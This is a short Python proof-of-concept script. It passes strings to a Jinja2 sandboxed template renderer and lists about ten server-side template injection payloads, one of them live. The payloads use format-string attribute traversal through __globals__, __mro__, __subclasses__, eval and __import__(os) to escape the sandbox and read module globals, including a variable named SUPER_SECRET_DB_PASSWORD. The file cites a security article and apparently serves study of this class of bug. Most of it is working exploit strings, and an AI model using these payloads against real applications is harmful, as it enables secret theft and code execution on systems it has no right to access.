import jinja2, jinja2.sandbox

def send_mail(receiver, subject, body):
    return render_template(body)

def render_template(body):
    try:
        sandboxed_env = jinja2.sandbox.SandboxedEnvironment()
        template = sandboxed_env.from_string(body).render()
    except (jinja2.TemplateSyntaxError, jinja2.sandbox.SecurityError) as err:
        print(err)
        raise ValueError("Template error")

    return template


# res = render_template("{{ '{0} is {0.__class__.__mro__[1].__subclasses__()}'.format('A') }}")
# res = render_template("{{ '{0.__class__.__mro__}'.format('a') }}")
# res = render_template("{{ '{0.__init__}'.format(request) }}")
# res = render_template('{{ "{.func_globals[_mutable_sequence_types][1].insert.__func__.func_globals[sys].modules[__main__].SUPER_SECRET_DB_PASSWORD}".format(range) }}')
res = render_template("{{ '{.__globals__[_mutable_sequence_types][1].insert.__globals__[sys].modules[__main__].__dict__}'.format(range) }}")
# res = render_template("{{ '{.__globals__[_mutable_sequence_types][0].__init__.__class__.__mro__[1].__name__}'.format(range) }}")
# res = render_template("{{ '{.__globals__}'.format(range) }}")
# res = render_template("{{ self.__init__.__globals__[__builtins__][eval] }}")
# res = render_template("{{ '{0.__init__.__globals__[__builtins__][__import__](os)}'.format(self) }}")
# res = render_template("{{''|attr('__class__')()}}")
print(res)

# https://sekurak.pl/podatnosc-server-side-template-injections/


#{{ "{.func_globals[_mutable_sequence_types][1].insert.__func__.func_globals[sys].modules[__main__].SUPER_SECRET_DB_PASSWORD}".format(range) }}
# print(send_mail.__globals__)
